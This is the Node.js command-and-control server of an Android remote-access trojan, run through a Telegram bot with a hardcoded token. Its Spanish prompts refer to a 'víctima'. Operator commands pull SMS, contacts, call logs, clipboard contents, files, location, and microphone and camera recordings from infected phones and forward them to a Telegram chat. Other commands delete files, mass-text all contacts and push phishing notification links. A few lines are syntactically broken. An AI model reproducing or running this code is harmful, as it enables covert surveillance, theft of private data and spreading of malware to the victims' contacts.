const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '7163553648:AAHHiZXhk5SEfZFOxnzqG1KPO-qMdpVCW9w'
const id = '7060108163'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• Mensaje de <b>${req.headers.model}</b> dispositivo`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°•mensaje de <b>${req.headers.model}</b> dispositivo \n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• localización de <b>${req.headers.model}</b> dispositivo `, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• NUEVO DISPOSITIVO CONECTADO\n\n` +
        `• modelo : <b>${model}</b>\n` +
        `• CARGA : <b>${battery}</b>\n` +
        `• SISTEMA : <b>${version}</b>\n` +
        `• BRILLO : <b>${brightness}</b>\n` +
        `• OPERADOR : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• DISPOSITIVO DESCONECTADO\n\n` +
            `• MODELO : <b>${model}</b>\n` +
            `• BATERIA : <b>${battery}</b>\n` +
            `• SISTEMA : <b>${version}</b>\n` +
            `• BRILLO : <b>${brightness}</b>\n` +
            `• OPERADOR : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°•Por favor, responde al número al que deseas enviar el SMS.
        ')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• Genial, ahora ingresa el mensaje que deseas enviar a este número.\n\n' +
                '• Sé cuidadoso, ya que el mensaje no se enviará si el número de caracteres en tu mensaje supera el límite permitido.',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• Genial, ahora ingresa el mensaje que deseas enviar a este número.')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud está en proceso.\n\n' +
                '• Recibirás una respuesta en los próximos momentos.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["dispositivo conectado"], ["ejecutar comando"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Ingresa el mensaje que deseas enviar a todos los contactos.')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud está en proceso.\n\n' +
                '• Recibirás una respuesta en los próximos momentos.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Ingresa la ruta del archivo que deseas descargar.')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud está en proceso.\n\n' +
                '• Recibirás una respuesta en los próximos momentos.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Ingresa la ruta del archivo que deseas eliminar.')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud está en proceso.\n\n' +
                '• Recibirás una respuesta en los próximos momentos.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Ingresa cuánto tiempo deseas que el micrófono grabe.')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud está en proceso.\n\n' +
                '• Recibirás una respuesta en los próximos momentos.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud está en proceso.\n\n' +
                '• Recibirás una respuesta en los próximos momentos.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Ingresa cuánto tiempo deseas que la cámara frontal grabe.')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud está en proceso.\n\n' +
                '• Recibirás una respuesta en los próximos momentos.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Ingresa el mensaje que deseas que aparezca en el dispositivo objetivo.')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud está en proceso.\n\n' +
                '• Recibirás una respuesta en los próximos momentos.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Ingresa el mensaje que deseas que aparezca como notificación.')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• Ingresa el enlace que deseas que se abra con la notificación.\n\n' +
                '• Cuando la víctima haga clic en la notificación, el enlace que estás ingresando se abrirá.',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• Ingresa el enlace que deseas que se abra con la notificación.')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud está en proceso.\n\n' +
                '• Recibirás una respuesta en los próximos momentos.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Ingresa el enlace del audio que deseas reproducir.')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud está en proceso.\n\n' +
                '• Recibirás una respuesta en los próximos momentos.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• BIENVENIDO\n\n' +
                '• SI TIENES PROBLEMAS EN LA INICIAR EL BOOT PRUEBA CON /start',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'Dispositivos conectados.') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• Dispositivos disponibles para conectar.\n\n' +
                    '• Asegúrate de que la aplicación esté instalada en el dispositivo objetivo.'
                )
            } else {
                let text = '°• Lista de dispositivos conectados. :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'Ejecutar comando.') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• Dispositivos disponibles para conectar.\n\n' +
                    '• Asegúrate de que la aplicación esté instalada en el dispositivo objetivo.'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• Selecciona el dispositivo para ejecutar el comando.', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• permiso denegado')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• Selecciona el comando para el dispositivo. : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'aplicaciones', callback_data: `apps:${uuid}`},
                        {text: 'información', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: ''obtener archivos, callback_data: `file:${uuid}`},
                        {text: 'eliminar archivo', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'portapapeles', callback_data: `clipboard:${uuid}`},
                        {text: 'microfono', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'cámara trasera', callback_data: `camera_main:${uuid}`},
                        {text: 'camara frontal', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'localización', callback_data: `location:${uuid}`},
                        {text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'llamadas', callback_data: `calls:${uuid}`},
                        {text: 'contactos', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'vibracion', callback_data: `vibrate:${uuid}`},
                        {text: 'notificación', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'mensajes', callback_data: `messages:${uuid}`},
                        {text: 'envar mansajes', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'reproducir audio', callback_data: `play_audio:${uuid}`},
                        {text: 'parar audio', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'enviar mensaje a todos los contactos',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Tu solicitud está en proceso.\n\n' +
            '• Recibirás una respuesta en los próximos momentos.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Tu solicitud está en proceso.\n\n' +
            '• Recibirás una respuesta en los próximos momentos.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Tu solicitud está en proceso.\n\n' +
            '• Recibirás una respuesta en los próximos momentos.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Tu solicitud está en proceso.\n\n' +
            '• Recibirás una respuesta en los próximos momentos.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Tu solicitud está en proceso.\n\n' +
            '• Recibirás una respuesta en los próximos momentos.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Tu solicitud está en proceso.\n\n' +
            '• Recibirás una respuesta en los próximos momentos.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Tu solicitud está en proceso.\n\n' +
            '• Recibirás una respuesta en los próximos momentos.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Tu solicitud está en proceso.\n\n' +
            '• Recibirás una respuesta en los próximos momentos.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Tu solicitud está en proceso.\n\n' +
            '• Recibirás una respuesta en los próximos momentos.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Tu solicitud está en proceso.\n\n' +
            '• Recibirás una respuesta en los próximos momentos.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Tu solicitud está en proceso.\n\n' +
            '• Recibirás una respuesta en los próximos momentos.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conectados."], ["Ejecutar comando."]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ingresa la ruta del archivo que deseas eliminar.\n\n' +
            '• No necesitas ingresar la ruta completa del archivo, solo ingresa la ruta principal. Por ejemplo, ingresa <br>DCIM/Camera</br> para eliminar archivos de la galería..',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ingresa cuánto tiempo deseas que el micrófono grabe.\n\n' +
            '• Nota que debes ingresar el tiempo numéricamente en unidades de segundos.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ingresa el mensaje que deseas que aparezca en el dispositivo objetivo.\n\n' +
            '• Un "toast" es un mensaje breve que aparece en la pantalla del dispositivo durante unos segundos.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ingresa el mensaje que deseas que aparezca como notificación.\n\n' +
            '• Tu mensaje aparecerá en la barra de estado del dispositivo objetivo, similar a una notificación regular.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Ingresa el enlace del audio que deseas reproducir.\n\n' +
            '• Nota que debes ingresar el enlace directo del sonido deseado; de lo contrario, el sonido no se reproducirá.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
